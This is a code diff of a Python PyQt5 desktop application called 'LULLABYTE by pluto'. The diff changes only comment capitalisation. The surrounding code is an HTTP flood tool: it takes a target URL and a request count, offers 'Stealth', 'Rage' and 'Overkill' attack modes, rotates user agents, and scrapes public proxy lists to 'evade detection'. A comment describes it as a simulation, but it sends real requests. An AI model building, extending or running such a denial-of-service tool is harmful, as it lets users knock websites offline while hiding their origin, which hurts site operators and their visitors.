@@ -11,19 +11,19 @@ from PyQt5.QtWidgets import (
 from PyQt5.QtCore import Qt, QThread, pyqtSignal
 from PyQt5.QtGui import QIcon, QColor
 
-# --- Configuration & Colors (Pink Theme) ---
-COLOR_BACKGROUND = "#1a0b14"       # Dark Pink/Black background
+# --- configuration & colors (pink theme) ---
+COLOR_BACKGROUND = "#1a0b14"       # dark pink/black background
 COLOR_FOREGROUND_MAIN_WINDOW = "#2d1b26" 
-COLOR_LABELS_BORDERS = "#ffb3c7"   # Soft Pink
+COLOR_LABELS_BORDERS = "#ffb3c7"   # soft pink
 COLOR_INPUT_BACKGROUND = "#2d1b26" 
 COLOR_INPUT_TEXT = "#ffb3c7"
-COLOR_LOG_TEXT = "#ffcce0"         # Light Pink Text
+COLOR_LOG_TEXT = "#ffcce0"         # light pink text
 COLOR_BUTTON_BACKGROUND = "#4a2e38"
 COLOR_BUTTON_TEXT = "#ffb3c7"
 COLOR_BUTTON_BORDER = "#1a0b14"
-COLOR_ERROR_BORDER = "#ff6699"     # Hot Pink
+COLOR_ERROR_BORDER = "#ff6699"     # hot pink
 
-# --- Assets & Data ---
+# --- assets & data ---
 USER_AGENTS = [
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
     "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
@@ -38,7 +38,7 @@ def scrape_proxies():
         "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http",
         "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
         "https://www.proxy-list.download/api/v1/get?type=http",
-        # ... (Adding a few more for robustness)
+        # ... (adding a few more for robustness)
         "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt",
         "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt"
     ]
@@ -89,7 +89,7 @@ class AttackThread(QThread):
                 if self.use_proxy and self.proxies:
                     proxy = {"http": random.choice(self.proxies)}
 
-                # Attack Logic Simulation
+                # attack logic simulation
                 if self.attack_mode == "Stealth":
                     requests.get(self.url, headers=headers, proxies=proxy, timeout=5)
                 elif self.attack_mode == "Rage":
@@ -123,7 +123,7 @@ class MainWindow(QMainWindow):
         self.setWindowTitle("LULLABYTE by pluto")
         self.setGeometry(200, 200, 750, 900)
 
-        # Main Styling (Pink Theme)
+        # main styling (pink theme)
         self.setStyleSheet(f"""
             QMainWindow {{
                 background-color: {COLOR_BACKGROUND};
@@ -178,19 +178,19 @@ class MainWindow(QMainWindow):
         self.setCentralWidget(central_widget)
         layout = QVBoxLayout()
 
-        # Title
+        # title
         title = QLabel("LULLABYTE")
         title.setAlignment(Qt.AlignCenter)
         title.setStyleSheet(f"font-size: 56px; color: {COLOR_LABELS_BORDERS}; text-shadow: 2px 2px 4px #ff6699;")
         layout.addWidget(title)
 
-        # Credit
+        # credit
         self.credit_label = QLabel("made by pluto")
         self.credit_label.setAlignment(Qt.AlignCenter)
         self.credit_label.setStyleSheet(f"color: {COLOR_LABELS_BORDERS}; font-size: 18px; text-shadow: 1px 1px 2px #ff6699;")
         layout.addWidget(self.credit_label, alignment=Qt.AlignCenter)
 
-        # Log Output
+        # log output
         self.log_output = QTextEdit()
         self.log_output.setReadOnly(True)
         self.log_output.setStyleSheet(f"""
@@ -202,38 +202,38 @@ class MainWindow(QMainWindow):
         layout.addWidget(self.log_output)
 
 
-        # URL Input
+        # url input
         url_label = QLabel("TARGET URL:")
         self.url_input = QLineEdit()
         self.url_input.setPlaceholderText("https://example.com")
         layout.addWidget(url_label)
         layout.addWidget(self.url_input)
 
-        # Requests Input
+        # requests input
         requests_label = QLabel("NUMBER OF REQUESTS:")
         self.requests_input = QLineEdit()
         self.requests_input.setPlaceholderText("10000")
         layout.addWidget(requests_label)
         layout.addWidget(self.requests_input)
 
-        # Mode Selector
+        # mode selector
         mode_label = QLabel("ATTACK MODE:")
         self.mode_selector = QComboBox()
         self.mode_selector.addItems(["Stealth", "Rage", "Overkill"])
         layout.addWidget(mode_label)
         layout.addWidget(self.mode_selector)
 
-        # Proxy Checkbox
+        # proxy checkbox
         self.use_proxy = QCheckBox("AUTO-FETCH PROXIES (Evade Detection)")
         self.use_proxy.setChecked(True)
         layout.addWidget(self.use_proxy)
 
-        # Progress Bar
+        # progress bar
         self.progress_bar = QProgressBar()
         self.progress_bar.setValue(0)
         layout.addWidget(self.progress_bar)
 
-        # Buttons
+        # buttons
         btn_layout = QHBoxLayout()
         
         self.start_button = QPushButton("LAUNCH LULLABYTE")
@@ -272,7 +272,7 @@ class MainWindow(QMainWindow):
         attack_mode = self.mode_selector.currentText()
         use_proxy = self.use_proxy.isChecked()
 
-        # UI State Updates
+        # ui state updates
         self.start_button.setEnabled(False)
         self.stop_button.setEnabled(True)
         self.url_input.setEnabled(False)
